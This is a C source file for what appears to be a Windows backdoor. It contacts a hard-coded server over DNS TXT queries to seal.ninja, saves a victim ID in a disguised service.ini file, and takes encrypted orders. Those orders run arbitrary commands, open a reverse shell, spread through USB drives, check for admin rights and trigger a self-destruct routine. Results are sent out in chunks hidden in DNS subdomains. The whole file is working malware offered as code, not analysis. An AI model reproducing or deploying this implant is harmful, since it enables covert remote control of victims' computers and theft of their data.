#include "headers.h"

void check_id(char *id) {

	char path[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
	strcat(path, "\\Windows\\service.ini");

	FILE* f = NULL;
	f = fopen(path,"r");

	if(f != NULL) {
		fread(id, sizeof(char), 6, f);
		fclose(f);
	}

}

void re(char* id) {

	char url[128] = {0};
	sprintf(url, "re.%s.seal.ninja", id);

	char* answer = NULL;
	
	do {
		answer = dns_query(url);
	} while (answer == NULL);

}

void get_id(char *id) {

	char* answer = NULL;
	FILE *f = NULL;

	do {
		answer = dns_query("up.seal.ninja");
	} while (answer == NULL);

	strncpy(id, answer, 6);

	char path[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
	strcat(path, "\\Windows\\service.ini");

	f = fopen(path,"w");
	if(f != NULL) {
		fwrite(id, sizeof(char), 6, f);
		fclose(f);
	}
}

char* dns_query(char *url) {

	PDNS_RECORD dns_rec;
	PIP4_ARRAY ip_arr;
	
	ip_arr = (PIP4_ARRAY)malloc(sizeof(IP4_ARRAY));
	ip_arr->AddrCount = 1;
	ip_arr->AddrArray[0] = inet_addr("51.83.76.145");

	DNS_STATUS status = DnsQuery_UTF8(url, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, ip_arr, &dns_rec, NULL);
	
	if (status != 0) {
		return NULL;
	}

	if (dns_rec->Data.TXT.dwStringCount != 0) {
		return dns_rec->Data.TXT.pStringArray[0];
	}

	return NULL;
}

int get_order(char *id) {
	char url[256] = {0};

	sprintf(url, "order.%s.seal.ninja", id);

	char* order = dns_query(url);
	if (order != NULL) {
		parse_order(id, order);
		return 0;
	}
	
	return 1;
}

int count(char* string, char delim) {

	int n = 0;
	int len = strlen(string);

	for (int i = 0; i < len; i++) {
		if (string[i] == delim && i != len - 1) {
			n++;
		}
	}

	return n + 1;
}

char** split(char* string, char* delim) {

	char** array = NULL;
	int cnt = count(string, delim[0]);
	array = malloc(sizeof(char*) * cnt);

	char* tok;
	tok = strtok(string, delim);

	int i = 0;
	while (tok != NULL) {
		array[i] = malloc(sizeof(char) * (strlen(tok) + 1));
		strcpy(array[i], tok);
		i++;
		tok = strtok(NULL, delim);
	}

	return array;
}

void parse_order(char *id, char *order) {

	uint8_t* key = generate_aes_key(id);

	BUFFER* buffer = malloc(sizeof(BUFFER));
	buffer->size = strlen(order);
	buffer->content = malloc(sizeof(char) * buffer->size);

	strcpy(buffer->content, order);

	BUFFER* decrypted = aes_decrypt(buffer, key);
	
	char** orders = split(decrypted->content, ";");


	if (strcmp(orders[0], "0") == 0) {
		goto exit;
	}

	else if(strcmp(orders[0], "1") == 0) {
		answer_order(id, 1, get_sysinfo());
	}

	else if (strcmp(orders[0], "2") == 0) {
		char* answer = exec(orders[1]);
		answer_order(id, 2, answer);
	}

	else if(strcmp(orders[0], "3") == 0) {
		DWORD revshell_thread_id;
		NETWORK net;
		strcpy(net.ip, orders[1]);
		strcpy(net.port, orders[2]);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)reverse_shell, &net, 0, &revshell_thread_id);
	}
	else if (strcmp(orders[0], "4") == 0) {
		DWORD scan_thread_id;
		if (_scan_flag == 0) {
			_scan_flag = 1;
		}
		else {
			_scan_flag = 0;
		}
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)scan_usb, NULL, 0, &scan_thread_id);
	}

	else if (strcmp(orders[0], "5") == 0) {
		frequency(atoi(orders[1]));
		char *delay = NULL;
		delay = malloc(sizeof(char) * (strlen(orders[1]) + 1));
		sprintf(delay, "%d", _delay);
		answer_order(id, 5, delay);
	}

	else if (strcmp(orders[0], "6") == 0) {
		char* replication = NULL;
		replication = malloc(sizeof(char) * (1 + 1));
		sprintf(replication, "%d", _scan_flag);
		answer_order(id, 6, replication);
	}

	else if (strcmp(orders[0], "7") == 0) {
		char* admin = NULL;
		admin = malloc(sizeof(char) * (1 + 1));
		int is_admin = is_elevated();
		sprintf(admin, "%d", is_admin);
		answer_order(id, 7, admin);
	}

	else if (strcmp(orders[0], "8") == 0) {
		cleanup();
	}

	else if (strcmp(orders[0], "66") == 0) {
		order66();
	}

	exit:
		;
}

char *build_url(BUFFER *buff, int status, char *id, int order_id) {
	char *url = NULL;
	int url_len = strlen(id) + 2 + 1 + buff->size + strlen("resp.....seal.ninja") + 1;
	url = malloc(sizeof(char) * url_len);

	sprintf(url, "resp.%s.%d.%d.", id, order_id, status);
	strncat(url, buff->content, buff->size);
	strcat(url, ".seal.ninja");
	url[url_len] = '\0';

	return url;
}

void answer_order(char *id, int order_id, char *answer) {

	uint8_t *key = generate_aes_key(id);

	BUFFER *buffer = malloc(sizeof(BUFFER));
	buffer->size = strlen(answer);
	buffer->content = malloc(sizeof(char) * buffer->size);

	strcpy(buffer->content, answer);

	BUFFER *encrypted = aes_encrypt(buffer, key);

	char *url = NULL;

	BUFFER *chunk = malloc(sizeof(BUFFER));
	chunk->content = malloc(sizeof(char) * MAX_SUBDOMAIN_LEN);
	chunk->size = 0;

	int sent = 0;
	int i = 0;

	if(encrypted->size < MAX_SUBDOMAIN_LEN) {

		url = build_url(encrypted, 0, id, order_id);
		dns_query(url);

	} else {
		chunk->size = 0;
		for (i = sent; i < MAX_SUBDOMAIN_LEN + sent && encrypted->content[i] != '\0'; i++) {
			chunk->content[i - sent] = encrypted->content[i];
			chunk->size++;
		}
		chunk->content[chunk->size] = '\0';
		sent += i;

		url = build_url(chunk, 1, id, order_id);
		dns_query(url);

		while(sent < encrypted->size) {
			chunk->size = 0;
			for(i = sent; i < MAX_SUBDOMAIN_LEN+sent && encrypted->content[i] != '\0'; i++) {
				chunk->content[i-sent] = encrypted->content[i];
				chunk->size++;
			}
			chunk->content[chunk->size] = '\0';
			sent += chunk->size;

			if(sent >= encrypted->size) {
				url = build_url(chunk, 3, id, order_id);
			} else {
				url = build_url(chunk, 2, id, order_id);
			}

			dns_query(url);

		}
	}
}
